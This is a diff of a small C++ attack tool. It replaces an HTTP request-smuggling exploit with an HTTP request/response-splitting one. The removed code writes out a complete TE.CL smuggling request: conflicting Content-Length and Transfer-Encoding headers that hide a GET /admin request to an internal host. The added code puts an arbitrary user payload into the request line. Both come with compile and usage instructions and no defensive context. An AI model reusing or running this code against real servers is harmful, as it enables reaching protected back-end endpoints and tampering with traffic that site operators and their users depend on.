@@ -1,5 +1,5 @@
-// Compile: g++ -o http_smuggle http_smuggle.cpp
-// Run: ./http_smuggle <target_host> <port>
+// Compile: g++ -o http_split http_split.cpp
+// Run: ./http_split <host> <port> <payload>
 // No special privileges required
 
 #include <iostream>
@@ -9,15 +9,16 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <netdb.h>
+#include <string>
 
-class HTTPSmuggler {
+class HTTPSplitter {
 private:
     int sock;
     std::string host;
     int port;
     
 public:
-    HTTPSmuggler(const std::string& h, int p) : host(h), port(p) {}
+    HTTPSplitter(const std::string& h, int p) : host(h), port(p) {}
     
     bool connect() {
         sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -34,18 +35,10 @@ public:
         return ::connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0;
     }
     
-    std::string smuggle() {
-        // TE.CL smuggling attack
+    std::string split(const std::string& payload) {
         std::string request = 
-            "POST / HTTP/1.1\r\n"
+            "GET /" + payload + " HTTP/1.1\r\n"
             "Host: " + host + "\r\n"
-            "Content-Length: 13\r\n"
-            "Transfer-Encoding: chunked\r\n"
-            "\r\n"
-            "0\r\n"
-            "\r\n"
-            "GET /admin HTTP/1.1\r\n"
-            "Host: internal\r\n"
             "\r\n";
         
         send(sock, request.c_str(), request.length(), 0);
@@ -59,17 +52,17 @@ public:
         return "";
     }
     
-    ~HTTPSmuggler() { if (sock >= 0) close(sock); }
+    ~HTTPSplitter() { if (sock >= 0) close(sock); }
 };
 
 int main(int argc, char* argv[]) {
-    if (argc != 3) {
-        std::cerr << "Usage: " << argv[0] << " <host> <port>\n";
+    if (argc != 4) {
+        std::cerr << "Usage: " << argv[0] << " <host> <port> <payload>\n";
         return 1;
     }
-    HTTPSmuggler smuggler(argv[1], atoi(argv[2]));
-    if (smuggler.connect()) {
-        std::cout << smuggler.smuggle() << std::endl;
+    HTTPSplitter splitter(argv[1], atoi(argv[2]));
+    if (splitter.connect()) {
+        std::cout << splitter.split(argv[3]) << std::endl;
     }
     return 0;
 }
